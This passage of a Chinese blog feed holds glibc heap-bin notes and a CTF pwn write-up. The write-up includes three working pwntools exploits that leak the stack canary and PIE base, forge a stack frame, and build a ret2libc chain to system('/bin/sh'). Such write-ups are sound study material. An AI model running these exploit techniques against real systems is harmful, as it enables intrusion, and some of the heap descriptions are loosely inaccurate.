之前的缓冲区，刚刚被释放，还未分类的chunk。bin[1]</li><li>FIFO的双向链表，当执行<code>free()</code>函数时，内存分配器会根据释放的内存块的大小，将它们放置到不同的内存块链表中。对于小于等于<code>FASTBIN_MAX_SIZE</code>的内存块，它们会被放置到<code>fastbin</code>中，而对于大于<code>FASTBIN_MAX_SIZE</code>的内存块，则会被放置到<code>unsorted bin</code>中。存放未被整理的 chunk</li><li>malloc时，内存分配器首先会尝试从<code>fastbin</code>中分配空闲内存块，当分配器需要分配大于<code>FASTBIN_MAX_SIZE</code>的内存时，它会尝试从<code>unsorted bin</code>中分配内存块。如果分配器发现<code>unsorted bin</code>中有适合大小的空闲块，它将选择其中一个，并返回给应用程序。如果没有适合的空闲块，则分配器会将<code>unsorted bin</code>中的空闲块合并，并将合并后的大块添加到<code>large bin</code>中。会依次查找<code>small bin</code>、<code>large bin</code>、<code>mmapped</code>等其他内存块，直到找到合适的内存块。</li><li><img src="/2023/02/25/23-2-25-heap/image-20230225150843293.png" alt="image-20230225150843293" style="zoom:50%;"></li></ol><h3 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h3><p>size&#x3D; 2* size_sz * index</p><table><thead><tr><th align="left">下标</th><th align="left">SIZE_SZ&#x3D;4（32 位）</th><th align="left">SIZE_SZ&#x3D;8（64 位）</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">16</td><td align="left">32</td></tr><tr><td align="left">3</td><td align="left">24</td><td align="left">48</td></tr><tr><td align="left">4</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">5</td><td align="left">40</td><td align="left">80</td></tr><tr><td align="left">x</td><td align="left">2*4*x</td><td align="left">2*8*x</td></tr><tr><td align="left">63</td><td align="left">504</td><td align="left">1008</td></tr></tbody></table><ol><li>每个链表中存储的 chunk 大小都一致</li><li>循环双向链表，每个链表都有链表头结点</li><li><strong>small bins 中每个 bin 对应的链表采用 FIFO 的规则</strong></li><li>释放的时候会检查相邻的是不是free的，如果是进行合并然后放到 unsortedbin</li><li><img src="/2023/02/25/23-2-25-heap/image-20230225151846846.png" alt="image-20230225151846846" style="zoom:50%;"></li></ol><h3 id="large-Bin"><a href="#large-Bin" class="headerlink" title="large Bin"></a>large Bin</h3><ol><li><p>bins[64] ~ bins[126] </p></li><li><p>循环双向链表 FIFO</p></li><li><p>这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p><table><thead><tr><th align="left">组</th><th align="left">数量</th><th align="left">公差</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64B</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512B</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096B</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768B</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144B</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">不限制</td></tr></tbody></table></li><li><img src="/2023/02/25/23-2-25-heap/image-20230225152540343.png" alt="image-20230225152540343" style="zoom: 67%;"></li></ol><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>一般申请的 heap 是不连续的，因此需要记录不同 heap 之间的链接结构。</p><p>该数据结构是专门为从 Memory Mapping Segment 处申请的内存准备的，即为非主线程(mmap申请)准备的。</p><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。会在最新申请的arena中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="分配和释放过程"><a href="#分配和释放过程" class="headerlink" title="分配和释放过程"></a><a href="https://blog.csdn.net/sinat_19596835/article/details/81665095">分配和释放过程</a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> HEAP MANGER </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几经周折rop</title>
      <link href="/2023/02/16/23-2-16/"/>
      <url>/2023/02/16/23-2-16/</url>
      
        <content type="html"><![CDATA[<p>信号与系统实在复习不下去</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>链接：<a href="https://pan.baidu.com/s/1_EXQHF0uumBE2tWhloeiNg">https://pan.baidu.com/s/1_EXQHF0uumBE2tWhloeiNg</a><br>提取码：2thf</p><p>某大学冬令营，题目本来是很简单的，但是刚开始出题方靶机环境可能出现了某些问题，导致exp一直可以打通本地，打远程一直打不出flag，也不敢质疑是官方的问题，一直在改自己的exp，不过也引发了自己的一些思考，写出了多种思路，最后官方修复了，写的几个exp也都打通了</p><span id="more"></span><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p><img src="/2023/02/16/23-2-16/image-20230216230353617.png" alt="image-20230216230353617"></p><h4 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h4><p><img src="/2023/02/16/23-2-16/image-20230216230425068.png" alt="image-20230216230425068"></p><p>好家伙保护开满了</p><h3 id="ida静态分析"><a href="#ida静态分析" class="headerlink" title="ida静态分析"></a>ida静态分析</h3><p><img src="/2023/02/16/23-2-16/image-20230216230715969.png" alt="image-20230216230715969"></p><p>很快发现了两处输入都有漏洞函数点，buf只有8byte容量，却分别读入0x1e和0x5a，还有后门函数win嘿嘿</p><p><img src="/2023/02/16/23-2-16/image-20230216230920491.png" alt="image-20230216230920491"></p><p>很明显，后门函数提供给我们伪造栈帧的便利，读取flag.txt文件并打印出来，但是缺少fla，那么思路大致有了，伪造栈帧并进行rop</p><h2 id="调试并编写exp"><a href="#调试并编写exp" class="headerlink" title="调试并编写exp"></a>调试并编写exp</h2><ol><li>由于开启了canary保护，我需要先泄露canary，利用canary最low一个byte恒为0，且canary恒在push rbp的上方，buf距离rbp0x12&#x3D;18，我们我们只需要10byte就可以到canary，再覆盖canary最low一个byte就可以利用printf(“You said: %s\n”, (const char *)&amp;buf);把canary输出出来，paylaod为b’a’*11,泄露canary的同时我们也泄露了保存的rbp，后面伪造栈帧时有用，泄露完之后我们在下一次read要填补上canary，进行下一下循环，getfeedback()</li><li>由于开启pie保护，我们还要泄露pie基址</li></ol><p><img src="/2023/02/16/23-2-16/image-20230216234031392.png" alt="image-20230216234031392"></p><p>b’a’*26泄露地址，减去elf处改地址即为pie基址，这里不用担心我们会覆盖canary，canary只有在该函数返回时，才会检测canary，</p><p><img src="/2023/02/16/23-2-16/image-20230216235350781.png" alt="image-20230216235350781"></p><p>下面还有一次read函数，这次read我们构造rop链，恢复canary</p><ol start="3"><li>在构造前我们先分析下win</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win函数汇编</span><br><span class="line">0x0000555555555249 &lt;+0&gt;:     endbr64 </span><br><span class="line">0x000055555555524d &lt;+4&gt;:     push   rbp</span><br><span class="line">0x000055555555524e &lt;+5&gt;:     mov    rbp,rsp</span><br><span class="line">0x0000555555555251 &lt;+8&gt;:     sub    rsp,0x70</span><br><span class="line">0x0000555555555255 &lt;+12&gt;:    mov    ecx,esi</span><br><span class="line">0x0000555555555257 &lt;+14&gt;:    mov    eax,edx</span><br><span class="line">0x0000555555555259 &lt;+16&gt;:    mov    edx,edi    ;很正常的64位程序寄存器传参，前6个参数从左向右rdi rsi rdx rcx r8 r9没办法干预</span><br><span class="line">0x000055555555525b &lt;+18&gt;:    mov    BYTE PTR [rbp-0x64],dl    f;这里开始开始把我们的参数往栈上转移，有可乘之机,</span><br><span class="line">0x000055555555525e &lt;+21&gt;:    mov    edx,ecx</span><br><span class="line">0x0000555555555260 &lt;+23&gt;:    mov    BYTE PTR [rbp-0x68],dl    l</span><br><span class="line">0x0000555555555263 &lt;+26&gt;:    mov    BYTE PTR [rbp-0x6c],al   a       </span><br><span class="line">0x0000555555555266 &lt;+29&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000055555555526f &lt;+38&gt;:    mov    QWORD PTR [rbp-0x8],rax            </span><br><span class="line">0x0000555555555273 &lt;+42&gt;:    xor    eax,eax</span><br><span class="line">0x0000555555555275 &lt;+44&gt;:    mov    QWORD PTR [rbp-0x4a],0x0    ;先把这几位置零</span><br><span class="line">0x000055555555527d &lt;+52&gt;:    mov    WORD PTR [rbp-0x42],0x0</span><br><span class="line">0x0000555555555283 &lt;+58&gt;:    movzx  eax,BYTE PTR [rbp-0x64];参数转移</span><br><span class="line">0x0000555555555287 &lt;+62&gt;:    mov    BYTE PTR [rbp-0x4a],al    f</span><br><span class="line">0x000055555555528a &lt;+65&gt;:    movzx  eax,BYTE PTR [rbp-0x68]    </span><br><span class="line">0x000055555555528e &lt;+69&gt;:    mov    BYTE PTR [rbp-0x49],al    l</span><br><span class="line">0x0000555555555291 &lt;+72&gt;:    movzx  eax,BYTE PTR [rbp-0x6c]  a;从这里倒推即可</span><br><span class="line">0x0000555555555295 &lt;+76&gt;:    mov    BYTE PTR [rbp-0x48],al</span><br><span class="line">0x0000555555555298 &lt;+79&gt;:    mov    BYTE PTR [rbp-0x47],0x67        </span><br><span class="line">0x000055555555529c &lt;+83&gt;:    mov    BYTE PTR [rbp-0x46],0x2e</span><br><span class="line">0x00005555555552a0 &lt;+87&gt;:    mov    BYTE PTR [rbp-0x45],0x74</span><br><span class="line">0x00005555555552a4 &lt;+91&gt;:    mov    BYTE PTR [rbp-0x44],0x78</span><br><span class="line">0x00005555555552a8 &lt;+95&gt;:    mov    BYTE PTR [rbp-0x43],0x74</span><br><span class="line">0x00005555555552ac &lt;+99&gt;:    lea    rax,[rbp-0x4a]</span><br><span class="line">0x00005555555552b0 &lt;+103&gt;:   lea    rsi,[rip+0xd51]        # 0x555555556008</span><br><span class="line">0x00005555555552b7 &lt;+110&gt;:   mov    rdi,rax</span><br><span class="line">0x00005555555552ba &lt;+113&gt;:   call   0x555555555140 &lt;fopen@plt&gt;</span><br><span class="line">0x00005555555552bf &lt;+118&gt;:   mov    QWORD PTR [rbp-0x58],rax</span><br><span class="line">0x00005555555552c3 &lt;+122&gt;:   cmp    QWORD PTR [rbp-0x58],0x0</span><br><span class="line">0x00005555555552c8 &lt;+127&gt;:   jne    0x5555555552e0 &lt;win+151&gt;</span><br><span class="line">0x00005555555552ca &lt;+129&gt;:   lea    rdi,[rip+0xd39]        # 0x55555555600a</span><br><span class="line">0x00005555555552d1 &lt;+136&gt;:   call   0x5555555550d0 &lt;puts@plt&gt;</span><br><span class="line">0x00005555555552d6 &lt;+141&gt;:   mov    edi,0x1</span><br><span class="line">0x00005555555552db &lt;+146&gt;:   call   0x555555555150 &lt;exit@plt&gt;</span><br><span class="line">0x00005555555552e0 &lt;+151&gt;:   mov    QWORD PTR [rbp-0x40],0x0</span><br><span class="line">0x00005555555552e8 &lt;+159&gt;:   mov    QWORD PTR [rbp-0x38],0x0</span><br><span class="line">0x00005555555552f0 &lt;+167&gt;:   mov    QWORD PTR [rbp-0x30],0x0</span><br><span class="line">0x00005555555552f8 &lt;+175&gt;:   mov    QWORD PTR [rbp-0x28],0x0</span><br><span class="line">0x0000555555555300 &lt;+183&gt;:   mov    QWORD PTR [rbp-0x20],0x0</span><br><span class="line">0x0000555555555308 &lt;+191&gt;:   mov    QWORD PTR [rbp-0x18],0x0</span><br><span class="line">0x0000555555555310 &lt;+199&gt;:   mov    rdx,QWORD PTR [rbp-0x58]</span><br><span class="line">0x0000555555555314 &lt;+203&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">0x0000555555555318 &lt;+207&gt;:   mov    esi,0x20</span><br><span class="line">0x000055555555531d &lt;+212&gt;:   mov    rdi,rax</span><br><span class="line">0x0000555555555320 &lt;+215&gt;:   call   0x555555555110 &lt;fgets@plt&gt;</span><br><span class="line">0x0000555555555325 &lt;+220&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">0x0000555555555329 &lt;+224&gt;:   mov    rdi,rax</span><br><span class="line">0x000055555555532c &lt;+227&gt;:   call   0x5555555550d0 &lt;puts@plt&gt;</span><br><span class="line">0x0000555555555331 &lt;+232&gt;:   nop</span><br><span class="line">0x0000555555555332 &lt;+233&gt;:   mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">0x0000555555555336 &lt;+237&gt;:   xor    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000055555555533f &lt;+246&gt;:   je     0x555555555346 &lt;win+253&gt;</span><br><span class="line">0x0000555555555341 &lt;+248&gt;:   call   0x5555555550e0 &lt;__stack_chk_fail@plt&gt; ;检测canary</span><br><span class="line">0x0000555555555346 &lt;+253&gt;:   leave  </span><br><span class="line">0x0000555555555347 &lt;+254&gt;:   ret </span><br></pre></td></tr></table></figure><ol start="3"><li><p>我们把断点断到leave ret处  发现rbp指向就是我们ret的下方，如果我们把ret下方覆盖为fla的话，只需要把原来的栈提高0x6c,(0x0000555555555263 &lt;+26&gt;:    mov    BYTE PTR [rbp-0x6c],al )就可以伪造栈，伪造flag.txt，故payload为 <em>payload&#x3D;b’a’*10+p64(canary)+p64(rbp_ad+0x6c)+p64(win_ad)+b’a\x00\x00\x00’+b’l\x00\x00\x00’+b’f\x00\x00\x00’</em></p><p><img src="/2023/02/16/23-2-16/image-20230217000537025.png" alt="image-20230217000537025"></p></li></ol><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b* $rebase(0x138E)&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;like ctf?&#x27;</span>,padding)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">rbp_ad=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp_ad))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Do you like ctf?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">ret_ad=<span class="number">0x1447</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-ret_ad</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line">win_ad=<span class="number">0x1273</span>+base</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x6c</span>)+p64(win_ad)+<span class="string">b&#x27;a\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;l\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;f\x00\x00\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="再探"><a href="#再探" class="headerlink" title="再探"></a>再探</h2><p>官方的问题，前一个exp没打通，奇怪了，难道名字不叫flag.txt？，或许叫flag，又开始分析win汇编，我们可以直接控制栈和rsp,又从下面汇编的&lt;+62&gt;或者&lt;+99&gt;可以看出要打开的文件名字的存储地址为rbp-0x4a处，干嘛不直接覆盖这里，这样我们还可以控制文件名字</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555555283 &lt;+58&gt;:    movzx  eax,BYTE PTR [rbp-0x64]            ;参数转移</span><br><span class="line">0x0000555555555287 &lt;+62&gt;:    mov    BYTE PTR [rbp-0x4a],al    f</span><br><span class="line">0x000055555555528a &lt;+65&gt;:    movzx  eax,BYTE PTR [rbp-0x68]    </span><br><span class="line">0x000055555555528e &lt;+69&gt;:    mov    BYTE PTR [rbp-0x49],al    l</span><br><span class="line">0x0000555555555291 &lt;+72&gt;:    movzx  eax,BYTE PTR [rbp-0x6c]  a        ;从这里倒推即可</span><br><span class="line">0x0000555555555295 &lt;+76&gt;:    mov    BYTE PTR [rbp-0x48],al</span><br><span class="line">0x0000555555555298 &lt;+79&gt;:    mov    BYTE PTR [rbp-0x47],0x67        </span><br><span class="line">0x000055555555529c &lt;+83&gt;:    mov    BYTE PTR [rbp-0x46],0x2e</span><br><span class="line">0x00005555555552a0 &lt;+87&gt;:    mov    BYTE PTR [rbp-0x45],0x74</span><br><span class="line">0x00005555555552a4 &lt;+91&gt;:    mov    BYTE PTR [rbp-0x44],0x78</span><br><span class="line">0x00005555555552a8 &lt;+95&gt;:    mov    BYTE PTR [rbp-0x43],0x74</span><br><span class="line">0x00005555555552ac &lt;+99&gt;:    lea    rax,[rbp-0x4a]</span><br><span class="line">0x00005555555552b0 &lt;+103&gt;:   lea    rsi,[rip+0xd51]        # 0x555555556008</span><br><span class="line">0x00005555555552b7 &lt;+110&gt;:   mov    rdi,rax</span><br><span class="line">0x00005555555552ba &lt;+113&gt;:   call   0x555555555140 &lt;fopen@plt&gt;</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>把前一个exp的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">win_ad=<span class="number">0x1273</span>+base</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x6c</span>)+p64(win_ad)+<span class="string">b&#x27;a\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;l\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;f\x00\x00\x00&#x27;</span></span><br><span class="line">替换为</span><br><span class="line">win_ad=<span class="number">0x012AC</span>+base </span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x4a</span>)+p64(win_ad)+<span class="string">b&#x27;flag.txt\x00&#x27;</span> <span class="comment">#flag.txt文件名字可以改成我们想打开的名字</span></span><br></pre></td></tr></table></figure><h2 id="很生气呀，拿tm的shell"><a href="#很生气呀，拿tm的shell" class="headerlink" title="很生气呀，拿tm的shell"></a>很生气呀，拿tm的shell</h2><p>本地也通了，远程还是不行，试了好几个文件名字还不行，内心开始怀疑，也不想就这样放弃，继续分析发现可以直接拿shell</p><p>和前面一样先泄露canary rbp 和pie基址，程序有使用puts函数，我们可以利用puts泄露puts地址，由于是64为需要一个pop rdi的gadget给puts传参</p><p><img src="/2023/02/16/23-2-16/image-20230217002642059.png" alt="image-20230217002642059"></p><p>payload&#x3D;b’a’*10+p64(canary)+b’deadbeef’+p64(poprdi)+p64(puts_got)+p64(puts_plt)+p64(getFeedback)</p><p>这里再次返回canary是不会变得，即使是再次生成；变了的话也好说，在泄露一次就是了，或者rop返回时跳过生成</p><p>泄露后找到libc，就可以常规rop</p><p>payload&#x3D;b’a’*10+p64(canary)+b’deadbeef’+p64(poprdi)+p64(bin_sh)+p64(ret)+p64(system_ad)</p><p>这里在ret到system前多个ret是为了ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</p><blockquote><p>64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐,因为64位程序的地址是8字节的，而十六进制又是满16就会进位，因此我们看到的栈地址末尾要么是0要么是8。</p><p>只有当地址的末尾是0的时候，才算是与16字节对齐了，如果末尾是8的话，那就是没有对齐。而我们想要在ubuntu18以上的64位程序中执行system函数，必须要在执行system栈顶地址末尾是0。</p></blockquote><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b* $rebase(0x138E)&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;like ctf?&#x27;</span>,padding)</span><br><span class="line"><span class="comment"># print(io.recv())</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">rbp_ad=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp_ad))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Do you like ctf?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">ret_ad=<span class="number">0x1447</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-ret_ad</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment"># print(&quot;base&quot;+hex(base))</span></span><br><span class="line">poprdi=<span class="number">0x014d3</span>+base</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]+base</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]+base</span><br><span class="line">getFeedback=base+elf.symbols[<span class="string">&#x27;getFeedback&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(getFeedback))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+<span class="string">b&#x27;deadbeef&#x27;</span>+p64(poprdi)+p64(puts_got)+p64(puts_plt)+p64(getFeedback)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_ad=u64(io.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_ad&quot;</span>+<span class="built_in">hex</span>(puts_ad))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base_libc=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"><span class="comment"># base_libc=puts_ad-0x067970</span></span><br><span class="line">system_ad=base_libc+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment"># system_ad=base_libc+0x03f650</span></span><br><span class="line">bin_sh=base_libc+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment"># bin_sh=base_libc+0x163ef7</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">ret=base+<span class="number">0x0101a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system&quot;</span>+<span class="built_in">hex</span>(system_ad))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin&quot;</span>+<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ret&quot;</span>+<span class="built_in">hex</span>(ret))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+<span class="string">b&#x27;deadbeef&#x27;</span>+p64(poprdi)+p64(bin_sh)+p64(ret)+p64(system_ad)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Can you provide some extra feedback?\n&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>拿到shell，发现文件里有flag.txt，拿到flag，还在疑惑前两个为什么不行，又去试了一下前两个exp，这次发现都能打通，我….</p><h2 id="总结-有得有失"><a href="#总结-有得有失" class="headerlink" title="总结:有得有失"></a>总结:有得有失</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非栈上的格式化字符串漏洞</title>
      <link href="/2023/02/12/pwn/"/>
      <url>/2023/02/12/pwn/</url>
      
